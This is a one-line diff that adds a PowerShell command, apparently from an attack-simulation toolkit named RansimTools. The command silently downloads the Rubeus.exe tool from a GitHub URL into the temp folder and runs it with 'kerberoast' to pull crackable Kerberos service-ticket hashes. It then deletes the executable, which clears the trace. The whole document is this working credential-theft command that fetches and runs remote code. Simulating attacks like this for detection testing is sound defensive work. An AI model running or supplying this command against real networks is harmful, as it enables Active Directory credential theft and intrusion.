@@ -1,0 +1,1 @@
+$ProgressPreference = 'SilentlyContinue'; Invoke-WebRequest -URI https://github.com/BASE4-CyberSOC/RansimTools/raw/main/credentials/Rubeus.exe -Out $env:temp\rubeus.exe; Start-Process $env:temp\rubeus.exe -ArgumentList "kerberoast" -NoNewWindow -Wait; del $env:temp\rubeus.exe
